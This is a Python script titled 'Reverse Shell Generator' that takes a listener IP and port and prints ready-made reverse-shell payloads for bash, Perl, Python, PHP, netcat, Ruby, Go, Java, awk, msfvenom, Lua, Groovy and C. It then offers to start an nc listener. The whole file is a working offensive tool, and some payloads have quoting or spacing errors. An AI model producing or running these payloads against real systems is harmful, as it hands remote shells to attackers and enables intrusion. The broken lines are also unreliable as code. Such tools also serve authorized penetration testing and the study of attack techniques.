#!/usr/bin/python3
import os
import sys
#import subprocess
from time import sleep
os.system('clear')

start = "\t\t\t Reverse Shell Generator (By T3@m_XuNt3rz ) "

for i in start:
    print(i,end='')
    sys.stdout.flush()
    sleep(0.03)

ip = input("\nPls enter your listener ip address: ")
port = input("\nPls enter your listener port: ")

choice = input("""
      [0].Exit
      [1].Bash(TCP)
      [2].Bash(UDP)
      [3].Perl
      [4].Python
      [5].PHP
      [6].Netcat
      [7].Ruby
      [8].Golang
      [9].Java
      [11].Awk
      [12].War
      [13].Lua
      [14].Groovy
      [15].C Programming
      [16].Authors
      """)

def bash_tcp():
    bash_tcp = "\nbash -i >& /dev/tcp/"+ip+"/"+port+' '+"0>&1 \n "
    #subprocess.call('clear',shell=True)
    #print ("Bash_TCP Rerverse Shell = " + ' ' + bash_tcp)
    for i in bash_tcp:
       print(i,end='')
       sys.stdout.flush()
       sleep(0.03)
def bash_udp():
    bash_udp = "sh -i >& /dev/udp/"+ip+"/"+port+' '+"0>&1\n "
    #subprocess.call('clear',shell=True)
    #print ("Bash UDP Reverse Shell =  " + ' ' +bash_udp)
    for i in bash_udp:
       print (i,end='')
       sys.stdout.flush()
       sleep(0.03)
def perl():
    perl = ("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n" %(ip,port))
    #subprocess.call('clear',shell=True)
    #print ("Perl Rerverse Shell " + perl)
    for i in perl:
      print (i,end='')
      sys.stdout.flush()
      sleep(0.03)
def python():
    python = ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\n" %(ip,port))
    #subprocess.call('clear',shell=True)
    #print ("Python Reverse Shell =  " + ' ' + python)
    for i in python:
      print (i,end='')
      sys.stdout.flush()
      sleep(0.03)
def php():
    php= ("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n" %(ip,port))
    #subprocess.call('clear',shell=True)
    #print (php)
    for i in php:
      print (i,end='')
      sys.stdout.flush()
      sleep(0.03)
def netcat():
  netcat=("nc -e /bin/sh"+ ' '+ip+' '+port)
  #subprocess.call('clear',shell=True)
  for i in netcat:
    print(i,end='')
    sys.stdout.flush()
    sleep(0.03)
def ruby():
      ruby = ("ruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'\n")
      #subprocess.call('clear',shell=True)
      for i in ruby:
        print(i,end='')
        sys.stdout.flush()
        sleep(0.03)
def golang():
      golang = ("""echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""%(ip,port))
      #subprocess.call('clear',shell=True)
      for i in golang:
          print(i,end='')
          sys.stdout.flush()
          sleep(0.03)
def java():
      java=('''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()\n''' %(ip,port))
      #subprocess.call('clear',shell=True)
      for i in java:
          print(i,end='')
          sys.stdout.flush()
          sleep(0.03)
def listener():
    listen=input("Are you want to open listener with nc: (y,n)")
    if listen == 'y':
        os.system("nc -lvnp" + port)
    else:
        exit()
def awk():
    awk = ("""awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""" %(ip,port))
    for i in awk:
      print(i,end='')
      sys.stdout.flush()
      sleep(0.03)
def war():
    war = ("msfvenom -p java/jsp_shell_reverse_tcp LHOST= "+ip+" LPORT="+port+" -f war > reverse.war")
    for i in war:
      print(i,end='')
      sys.stdout.flush()
      sleep(0.03)
def lua():
    lua = ("""lua -e "require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');""" %(ip,port))
    for i in lua:
      print(i,end='')
      sys.stdout.flush()
      sleep(0.03)
def groovy():
    groovy = ("""\n String host="%s";
int port=%s;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""" %(ip,port))
    for i in groovy:
      print(i,end='')
      sys.stdout.flush()
      sleep(0.03)
def c():
    c = ("""
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

void shell(){
  int sockt;
  int port = %s; //change this port //
  struct sockaddr_in address;
  sockt = socket(AF_INET, SOCK_STREAM, 0);
  address.sin_family = AF_INET;
  address.sin_port = htons(port);
  address.sin_addr.s_addr = inet_addr("%s"); //Change this ip //
  connect(sockt, (struct sockaddr * ) &address,
    sizeof(address));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char * const argv[] = {"/bin/sh", NULL};
    execve ("/bin/sh", argv, NULL);
}
int main(){
  shell();
  return 0;

}
""" %(port,ip))
    print(c)
def author():
    author = ["K3nX", "Bl@ck_V1rtu@l", "C00l_K3lv1n", "D@ni3l"]
    print ("All Author are \n") 
    author = (author[0]+' '+','+' '+ author[1]+' '+','+' '+author[2]+' '+','+' '+author[3]+"\n")
    for i in author:
        print(i,end='')
        sys.stdout.flush()
        sleep (0.03)
def main():
  if choice == '1':
        bash_tcp()
        print("\n")
        listener()
  elif choice == '2':
        bash_udp()
        print("\n")
        listener()
  elif choice == '3':
        perl()
        print("\n")
        listener()
  elif choice == '4':
        python()
        print("\n")
        listener()
  elif choice == '5':
        php()
        print("\n")
        listener()
  elif choice == '6':
        netcat()
        print("\n")
        listener()
  elif choice == '7':
        ruby()
        print("\n")
        listener()
  elif choice == '8':
        golang()
        print("\n")
        listener()
  elif choice == '9':
        java()
        print("\n")
        listener()
  elif choice == '0':
        exit()
  elif choice =='11':
        awk()
        print("\n")
        listener()
  elif choice =='12':
        war()
        print("\n")
        listener()
  elif choice == '13':
        lua()
        print("\n")
        listener()
  elif choice == '14':
        groovy()
        print("\n")
        listener()
  elif choice == '15':
       c()
       print("\n")
       listener()
  elif choice == '16':
       author()
  else:
    print("Pls enter the valid entry")
if __name__ == "__main__":main()
